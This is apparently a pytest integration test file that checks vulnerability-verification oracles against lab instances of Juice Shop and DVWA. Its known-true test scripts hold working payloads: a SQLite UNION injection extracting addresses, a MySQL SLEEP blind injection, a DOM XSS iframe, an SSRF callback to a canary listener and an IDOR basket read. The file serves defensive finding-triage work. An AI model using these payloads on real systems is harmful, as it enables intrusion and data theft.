"""Live integration tests for deterministic oracles against lab containers.

Validates that hand-written known-true scripts produce Verdict.CONFIRMED and
known-false scripts produce Verdict.FALSE_POSITIVE across all 4 vulnerability
classes:
1. SQLi:
   - Known-true / known-false SQLite UNION canary extraction on Juice Shop
   - Known-true / known-false MySQL SLEEP time-based on DVWA
2. XSS:
   - Known-true Playwright DOM XSS on Juice Shop Angular SPA hash route
   - Known-false Playwright benign query on Juice Shop
3. SSRF:
   - Known-true out-of-band callback to canary listener via Juice Shop profile image URL
   - Known-false non-callback token submission
4. IDOR:
   - Known-true User A reading User B's basket (/rest/basket/{bid_b}) with canary coupon
   - Known-false User A reading User B's address (/api/Addresss/{id_b}) blocked with HTTP 400

All tests run inside SandboxRunner with unprivileged Docker containers on lab_net.
"""
import json
import uuid
from pathlib import Path
import pytest
import requests

from src.ingestion.schema import Finding, Verdict, VulnClass
from src.oracles.base import OracleContext, evaluate
from src.sandbox.runner import SandboxRunner
from lab.seed import seed_juice_shop, seed_dvwa, DEFAULT_CANARY

pytestmark = pytest.mark.integration


@pytest.fixture(scope="session")
def lab_creds():
    creds_path = Path("lab/credentials.json")
    if creds_path.exists():
        try:
            return json.loads(creds_path.read_text())
        except Exception:
            pass
    res = seed_juice_shop()
    seed_dvwa()
    creds_path.write_text(json.dumps(res, indent=2))
    return res


@pytest.fixture(autouse=True)
def clean_canary():
    try:
        requests.post("http://localhost:9999/_reset", timeout=3)
    except Exception:
        pass


def parse_telemetry(result):
    assert result.exit_code == 0, f"Script failed with exit {result.exit_code}.\nSTDERR:\n{result.stderr}\nSTDOUT:\n{result.stdout}"
    lines = [line.strip() for line in result.stdout.strip().splitlines() if line.strip()]
    assert lines, f"No stdout produced.\nSTDERR:\n{result.stderr}"
    try:
        return json.loads(lines[-1])
    except Exception as e:
        raise AssertionError(f"Could not parse last stdout line as JSON: {lines[-1]!r}. Error: {e}")


# ==============================================================================
# 1. SQLi: Juice Shop UNION extraction (SQLite)
# ==============================================================================

def test_live_sqli_union_juiceshop_known_true(lab_creds):
    """Known-true: Juice Shop products search allows 10-column UNION to extract canary from Addresses."""
    canary = lab_creds["canary_value"]
    script = """import json, requests

payload = "q')) UNION SELECT 1, streetAddress, 'desc', 1, 0, 'img', null, '2020', '2020', null FROM Addresses --"
r = requests.get("http://juiceshop:3000/rest/products/search", params={"q": payload}, timeout=10)
print(json.dumps({"completed": True, "body": r.text}))
"""
    runner = SandboxRunner()
    result = runner.run(script, vuln_class=VulnClass.SQLI)
    tel = parse_telemetry(result)

    finding = Finding(source="live", rule_id="sqli-union", url="http://juiceshop:3000/rest/products/search", cwe=89, vuln_class=VulnClass.SQLI)
    ctx = OracleContext(canary_value=canary)
    ores = evaluate(finding, tel, ctx)
    assert ores.verdict == Verdict.CONFIRMED
    assert "seeded canary extracted" in ores.reason


def test_live_sqli_union_juiceshop_known_false(lab_creds):
    """Known-false: Benign search query does not extract canary from Addresses."""
    canary = lab_creds["canary_value"]
    script = """import json, requests

r = requests.get("http://juiceshop:3000/rest/products/search", params={"q": "apple"}, timeout=10)
print(json.dumps({"completed": True, "body": r.text}))
"""
    runner = SandboxRunner()
    result = runner.run(script, vuln_class=VulnClass.SQLI)
    tel = parse_telemetry(result)

    finding = Finding(source="live", rule_id="sqli-union", url="http://juiceshop:3000/rest/products/search", cwe=89, vuln_class=VulnClass.SQLI)
    ctx = OracleContext(canary_value=canary)
    ores = evaluate(finding, tel, ctx)
    assert ores.verdict == Verdict.FALSE_POSITIVE
    assert "seeded canary not extracted" in ores.reason


# ==============================================================================
# 2. SQLi: DVWA Time-based Blind SQLi (MySQL SLEEP)
# ==============================================================================

def test_live_sqli_time_dvwa_known_true():
    """Known-true: DVWA sqli_blind with MySQL SLEEP(2) causes measurable delay."""
    script = """import json, re, time, requests

s = requests.Session()
# 1. Login
r_login_page = s.get("http://dvwa:80/login.php", timeout=5)
token = re.search(r"value='([a-f0-9]+)'", r_login_page.text).group(1)
s.post("http://dvwa:80/login.php", data={
    "username": "admin", "password": "password", "Login": "Login", "user_token": token
}, timeout=5)

# 2. Set security to low
r_sec_page = s.get("http://dvwa:80/security.php", timeout=5)
sec_token = re.search(r"value='([a-f0-9]+)'", r_sec_page.text).group(1)
s.post("http://dvwa:80/security.php", data={
    "security": "low", "seclev_submit": "Submit", "user_token": sec_token
}, timeout=5)

# 3. Measure baseline (2 trials)
base_ms = []
for _ in range(2):
    t0 = time.time()
    s.get("http://dvwa:80/vulnerabilities/sqli_blind/", params={"id": "1", "Submit": "Submit"}, timeout=5)
    base_ms.append(int((time.time() - t0) * 1000))

# 4. Measure payload (2 trials with SLEEP(2))
pay_ms = []
for _ in range(2):
    t0 = time.time()
    s.get("http://dvwa:80/vulnerabilities/sqli_blind/", params={"id": "1' AND SLEEP(2)#", "Submit": "Submit"}, timeout=10)
    pay_ms.append(int((time.time() - t0) * 1000))

print(json.dumps({
    "completed": True,
    "baseline_ms": base_ms,
    "payload_ms": pay_ms,
    "delay_s": 2,
}))
"""
    runner = SandboxRunner()
    result = runner.run(script, vuln_class=VulnClass.SQLI)
    tel = parse_telemetry(result)

    finding = Finding(source="live", rule_id="sqli-blind", url="http://dvwa:80/vulnerabilities/sqli_blind/", cwe=89, vuln_class=VulnClass.SQLI)
    ores = evaluate(finding, tel, OracleContext())
    assert ores.verdict == Verdict.CONFIRMED
    assert "payload consistently slower" in ores.reason


def test_live_sqli_time_dvwa_known_false():
    """Known-false: DVWA benign query does not exhibit timing delay."""
    script = """import json, re, time, requests

s = requests.Session()
r_login_page = s.get("http://dvwa:80/login.php", timeout=5)
token = re.search(r"value='([a-f0-9]+)'", r_login_page.text).group(1)
s.post("http://dvwa:80/login.php", data={
    "username": "admin", "password": "password", "Login": "Login", "user_token": token
}, timeout=5)

base_ms = []
for _ in range(2):
    t0 = time.time()
    s.get("http://dvwa:80/vulnerabilities/sqli_blind/", params={"id": "1", "Submit": "Submit"}, timeout=5)
    base_ms.append(int((time.time() - t0) * 1000))

pay_ms = []
for _ in range(2):
    t0 = time.time()
    s.get("http://dvwa:80/vulnerabilities/sqli_blind/", params={"id": "2", "Submit": "Submit"}, timeout=5)
    pay_ms.append(int((time.time() - t0) * 1000))

print(json.dumps({
    "completed": True,
    "baseline_ms": base_ms,
    "payload_ms": pay_ms,
    "delay_s": 2,
}))
"""
    runner = SandboxRunner()
    result = runner.run(script, vuln_class=VulnClass.SQLI)
    tel = parse_telemetry(result)

    finding = Finding(source="live", rule_id="sqli-blind", url="http://dvwa:80/vulnerabilities/sqli_blind/", cwe=89, vuln_class=VulnClass.SQLI)
    ores = evaluate(finding, tel, OracleContext())
    assert ores.verdict == Verdict.FALSE_POSITIVE
    assert "no timing delta" in ores.reason


# ==============================================================================
# 3. XSS: Juice Shop DOM XSS in Angular SPA hash route (Playwright)
# ==============================================================================

def test_live_xss_known_true():
    """Known-true: Juice Shop #/search route evaluates iframe javascript:alert payload."""
    script = """import json, urllib.parse
from playwright.sync_api import sync_playwright

xss_fired = False

def handle_dialog(dialog):
    global xss_fired
    xss_fired = True
    try:
        dialog.dismiss()
    except Exception:
        pass

payload = '<iframe src="javascript:alert(1)">'
url = "http://juiceshop:3000/#/search?q=" + urllib.parse.quote(payload)

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
    page = browser.new_page()
    page.on("dialog", handle_dialog)
    try:
        page.goto(url, wait_until="domcontentloaded", timeout=15000)
        page.wait_for_timeout(4000)
    except Exception:
        pass
    browser.close()

print(json.dumps({"completed": True, "xss_fired": xss_fired}))
"""
    runner = SandboxRunner()
    result = runner.run(script, vuln_class=VulnClass.XSS)
    tel = parse_telemetry(result)

    finding = Finding(source="live", rule_id="xss-dom", url="http://juiceshop:3000/#/search", cwe=79, vuln_class=VulnClass.XSS)
    ores = evaluate(finding, tel, OracleContext())
    assert ores.verdict == Verdict.CONFIRMED
    assert "JS execution observed" in ores.reason


def test_live_xss_known_false():
    """Known-false: Safe search string does not trigger JS alert."""
    script = """import json, urllib.parse
from playwright.sync_api import sync_playwright

xss_fired = False

def handle_dialog(dialog):
    global xss_fired
    xss_fired = True
    try:
        dialog.dismiss()
    except Exception:
        pass

url = "http://juiceshop:3000/#/search?q=" + urllib.parse.quote("safe_benign_query")

with sync_playwright() as p:
    browser = p.chromium.launch(headless=True, args=["--no-sandbox", "--disable-dev-shm-usage"])
    page = browser.new_page()
    page.on("dialog", handle_dialog)
    try:
        page.goto(url, wait_until="domcontentloaded", timeout=15000)
        page.wait_for_timeout(3000)
    except Exception:
        pass
    browser.close()

print(json.dumps({"completed": True, "xss_fired": xss_fired}))
"""
    runner = SandboxRunner()
    result = runner.run(script, vuln_class=VulnClass.XSS)
    tel = parse_telemetry(result)

    finding = Finding(source="live", rule_id="xss-dom", url="http://juiceshop:3000/#/search", cwe=79, vuln_class=VulnClass.XSS)
    ores = evaluate(finding, tel, OracleContext())
    assert ores.verdict == Verdict.FALSE_POSITIVE
    assert "no JS execution" in ores.reason


# ==============================================================================
# 4. SSRF: Juice Shop Profile Image Fetch with Canary Listener
# ==============================================================================

def test_live_ssrf_known_true(lab_creds):
    """Known-true: Juice Shop /profile/image/url fetches canary URL, hitting canary listener."""
    token_a = lab_creds["user_a"]["token"]
    test_token = str(uuid.uuid4())

    script = f'''import json, os, requests

token = "{test_token}"
auth = os.environ.get("AUTH_TOKEN", "")

# Juice Shop /profile/image/url requires cookies={{"token": auth}} and data={{"imageUrl": ...}}
r = requests.post(
    "http://juiceshop:3000/profile/image/url",
    cookies={{"token": auth}},
    data={{"imageUrl": "http://canary:9999/" + token}},
    timeout=10,
)
print(json.dumps({{"completed": True, "token": token}}))
'''
    runner = SandboxRunner()
    result = runner.run(script, env={"AUTH_TOKEN": token_a}, vuln_class=VulnClass.SSRF)
    tel = parse_telemetry(result)

    # Fetch canary hits from host
    hits_res = requests.get("http://localhost:9999/_hits", timeout=5)
    assert hits_res.status_code == 200
    hits = hits_res.json()

    finding = Finding(source="live", rule_id="ssrf-img", url="http://juiceshop:3000/profile/image/url", cwe=918, vuln_class=VulnClass.SSRF)
    ctx = OracleContext(canary_hits=hits)
    ores = evaluate(finding, tel, ctx)
    assert ores.verdict == Verdict.CONFIRMED
    assert "target issued inbound request" in ores.reason


def test_live_ssrf_known_false():
    """Known-false: Token that target is never asked to fetch is not found in canary hits."""
    dummy_token = str(uuid.uuid4())
    script = f"""import json
# Benign script generates token but makes no SSRF request to canary
print(json.dumps({{"completed": True, "token": "{dummy_token}"}}))
"""
    runner = SandboxRunner()
    result = runner.run(script, vuln_class=VulnClass.SSRF)
    tel = parse_telemetry(result)

    hits_res = requests.get("http://localhost:9999/_hits", timeout=5)
    hits = hits_res.json() if hits_res.status_code == 200 else []

    finding = Finding(source="live", rule_id="ssrf-img", url="http://juiceshop:3000/profile/image/url", cwe=918, vuln_class=VulnClass.SSRF)
    ctx = OracleContext(canary_hits=hits)
    ores = evaluate(finding, tel, ctx)
    assert ores.verdict == Verdict.FALSE_POSITIVE
    assert "no callback received" in ores.reason


# ==============================================================================
# 5. IDOR: User B Basket (Vulnerable) vs Address (Blocked)
# ==============================================================================

def test_live_idor_known_true(lab_creds):
    """Known-true: User A can read User B's basket (/rest/basket/{bid_b}) with canary coupon."""
    token_a = lab_creds["user_a"]["token"]
    bid_b = lab_creds["user_b"]["bid"]
    canary = lab_creds["canary_value"]

    script = f"""import json, os, requests

auth = os.environ.get("AUTH_TOKEN", "")
r = requests.get(
    "http://juiceshop:3000/rest/basket/{bid_b}",
    headers={{"Authorization": f"Bearer {{auth}}"}},
    timeout=5,
)
print(json.dumps({{"completed": True, "status": r.status_code, "body": r.text}}))
"""
    runner = SandboxRunner()
    result = runner.run(script, env={"AUTH_TOKEN": token_a}, vuln_class=VulnClass.IDOR)
    tel = parse_telemetry(result)

    finding = Finding(source="live", rule_id="idor-basket", url=f"http://juiceshop:3000/rest/basket/{bid_b}", cwe=639, vuln_class=VulnClass.IDOR)
    ctx = OracleContext(canary_value=canary)
    ores = evaluate(finding, tel, ctx)
    assert ores.verdict == Verdict.CONFIRMED
    assert "User A read User B's canary data" in ores.reason


def test_live_idor_known_false(lab_creds):
    """Known-false: User A reading User B's address (/api/Addresss/{addr_id}) is blocked with HTTP 400."""
    token_a = lab_creds["user_a"]["token"]
    addr_id_b = lab_creds["user_b"]["address_id"]
    canary = lab_creds["canary_value"]

    script = f"""import json, os, requests

auth = os.environ.get("AUTH_TOKEN", "")
r = requests.get(
    "http://juiceshop:3000/api/Addresss/{addr_id_b}",
    headers={{"Authorization": f"Bearer {{auth}}"}},
    timeout=5,
)
print(json.dumps({{"completed": True, "status": r.status_code, "body": r.text}}))
"""
    runner = SandboxRunner()
    result = runner.run(script, env={"AUTH_TOKEN": token_a}, vuln_class=VulnClass.IDOR)
    tel = parse_telemetry(result)

    finding = Finding(source="live", rule_id="idor-address", url=f"http://juiceshop:3000/api/Addresss/{addr_id_b}", cwe=639, vuln_class=VulnClass.IDOR)
    ctx = OracleContext(canary_value=canary)
    ores = evaluate(finding, tel, ctx)
    assert ores.verdict == Verdict.FALSE_POSITIVE
    assert "access denied or canary absent" in ores.reason
